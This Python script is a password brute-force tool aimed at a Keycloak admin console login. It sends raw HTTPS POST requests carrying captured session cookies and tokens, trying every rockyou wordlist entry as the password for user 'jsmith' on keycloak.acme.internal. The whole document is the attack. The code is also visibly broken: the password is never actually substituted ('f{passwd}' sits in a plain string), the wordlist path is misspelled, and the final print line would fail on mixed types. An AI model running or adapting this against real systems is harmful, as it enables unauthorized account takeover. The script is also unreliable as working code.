import ssl
import socket

def send_raw_http(raw_request: str, host: str, port: int, use_ssl: bool) -> dict:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if use_ssl:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)

    sock.connect((host, port))
    sock.sendall(raw_request.encode())

    raw_response = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        raw_response += chunk
    sock.close()

    headers_raw, _, content = raw_response.partition(b"\r\n\r\n")
    status_line = headers_raw.split(b"\r\n")[0]
    status_code = int(status_line.split(b" ")[1])

    return {
        "status_code": status_code,
        "content": content,
        "ok": 200 <= status_code < 300,
    }


wordlist = []
with open("/usr/share/worldlists/rockyou.txt") as fh:
    wordlist[:] = fh.read().split('\n')



for passwd in wordlist:
    content = """\
POST /realms/master/login-actions/authenticate?session_code=3ajNplpXgo9DeO0-TjEYV_SP8SbnVxgnTKlgSiKx94E&execution=eedcf0fd-23fb-40ea-b01b-a0364fa7f486&client_id=security-admin-console&tab_id=to4RXs_1G1s&client_data=eyJydSI6Imh0dHBzOi8va2V5Y2xvYWsuYWNtZS5pbnRlcm5hbDo4NDQzL2FkbWluL21hc3Rlci9jb25zb2xlLyIsInJ0IjoiY29kZSIsInJtIjoicXVlcnkiLCJzdCI6IjE0ZjI0Yjg1LTAxMmEtNDBlOS04MjVlLWEwYTBhMGQwOWU5YiJ9 HTTP/2
Host: keycloak.acme.internal:8443
Cookie: AUTH_SESSION_ID=enJnMmtQb2RSTWVyODNCMUdZc0pMWm1HLlVIYkw2MlZSaFh2YlFtT2V2cWxwVHdXM29Hd003UTVFUEFpczJ0TV9zUlVXU0NmNjRkUkFYTkllQk5NLTI4TnkwbzJleXJNU1htLThhcy1XR2xucmlR.keycloak-26669; KC_RESTART=eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0..0zYYyXMuDVd_pK54-qpJJA.tJblauxXxKOl58tZNaktzJEXUzgMMwh_pnGaD-ukw8_EeBe9Em4x-NBNYl8vXN9IVcsCiXDXuqPJBT_Pq-nFEwMCllccGC2O0-ouFjDZWC1vr5BcFXWP_Z8MgmrY5eOvp7lDNea4zbAJ1wXZXn48DNFt8UugcMX-m2GvZLANIdO6C5Ij5FRxRcwG3Lw3nRgz23a7LjGMvwjsiJF4hY8PZwz_bpY_RdRrNT1IytbeklytLLXpSjysCW4hxuhiBlAaHDW_evu6nYqNVWMRwIQkDs9vd9DwGHScXttwiqdkk9Py2ox0LXueoHDKap5a10cWcHQQ-Z3kB_qe8_eXG0-sG-Xef8yrK6zjTfJPwTR7ZzzDpwgO_f5B3lA6PwJLckCS8aTI55ZTYbDiWDt4QjhEHavUtFKo0lovTsiAM4tHbQn3Jl32rnhmA1AAlV5jK3pu2KyIRwoU3xH8EPBUnR0p5Bx0SY0nmYG5c8xO84veLccFhBSukz2l_idzej9k3TWSr9lR69sxHrc9lRy63i2pAaLv7q_dJNXoXAkDgxFU3vIQhXxKz915O1cfn8G8ve4vU_0Yn7fiHPdGT_R8eL5RXNUI2mFHXAqHJeTKBapWMVVMQ6sXntZaWR-UMDZNsfAxz7YSJRmw97ludAZX7fbabbJ7CYoXMuBKgxW8hB4DQcHJq03KdQLPWNMwlY158Jro8M77jMQ3L6Tglg7AoaZvteF_IY5xlXBUusf1AR7Vl5GAcOO4Nxg08TTvcK5v8-K8HQfMFveQQ8whIAk6ivVTx3rCSx26U38l4FNV6GddmrFvFARDBRsv4xjwSVoKjt6TXnt4ooiPc1g05zfscz7h36rx16ZMdjUA0PCKmljTMp9Uw08ZIiW9_nAEhXTJR6Hj7seQWiCdtJ-fgWcYB6X7Wo867V1FVuZXepduhhBNK2aNGYNLWIilV26Q2rqlp9dA0szFQz1L9z35fpWFdkEe69NlQrec_jickrQVEtZY0HJQOwyyb43VQanJ0p0VlGRFwMsOQbmf5vYPQLjIrrB7WPodBwBMwNwhpnALBS1Opm1Pv4RWKwWN_OdS6neBEzfyvH5qiunW6F4B_b_UjTifAkaBzBTfTBm9UqqkU2vWFuSn4VsOrCtyL2maU5UtgTnZ8S3NZjyrwTYP2bb49HISJtitA1InLDaBZk8GKhl8aoFmlGEO2cupUhNUU2v9_BSq.JSzJUQLHDFJpc9qnTZK8qw
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Origin: null
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=jsmith&password=f{passwd}&credentialId=
"""
    response = send_raw_http(content, "keycloak.acme.internal", 8443, True)

    print(response["ok"]+", "+int(response["status_code"])+", "+response["content"])
